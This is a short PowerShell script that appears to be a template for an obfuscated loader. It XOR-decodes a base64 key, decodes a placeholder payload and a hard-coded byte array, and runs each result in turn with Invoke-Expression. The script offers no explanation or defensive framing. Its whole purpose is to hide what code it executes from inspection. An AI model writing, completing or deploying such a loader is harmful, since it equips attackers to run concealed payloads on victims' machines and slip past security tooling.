function x($b, $s) {
    $newBytes = @();
    for ($i = 0; $i -lt $b.Count; $i++) {
        $newBytes += $b[$i] -bxor $s[$i % $s.Length];
    } 
    return $newBytes;
}


$_k = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDhmMGI4M2JmZGNkNTk3ZTRhNGEwYjMyMjJiNWZlMzY=")); 

$_i = "<B64-REPLACE>";
$_ix = x ([system.Text.Encoding]::UTF8.getBytes($_i)) $_k;
$_dix = x $_ix $_k;
$_dfix = [system.Text.Encoding]::UTF8.getString($_dix);
$_bd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_dfix));
Invoke-Expression $_bd

$_r = 121,86,16,95,9,93,30,53,3,6,49,1,68,76,82,22,64,65,25,52,67,7,113,83,65,91,1,101,7,23,64,95,94,95,70,23,10,76,71,18,21,94,76,75,69,88,68,17,81,3,93,15,30,1,92,95,29,64,3,66,73,45,125,65,89,11,0,65,7,31,19,30,70,55,6,8,80,90,67,72,123,3,94,4,83,22,19,31,119,74,18,84,8,1,19,117,95,86,18,85,12,76

$_dx = x $_r $_k;
$_gx0 = [system.Text.Encoding]::UTF8.getString($_dx)

$_rse =  x ([system.Text.Encoding]::UTF8.getBytes($_rs)) $_k;
$_rsp = $_rse -join ','

$_s1 = Invoke-Expression $_gx0
$_s2 = -join($_s1, $_rsp)

Invoke-Expression $_s2

$_dx3e = x $_exc $_k
$_dx3d = [system.Text.Encoding]::UTF8.getString($_dx3e);
 
Invoke-Expression $_dx3d
 
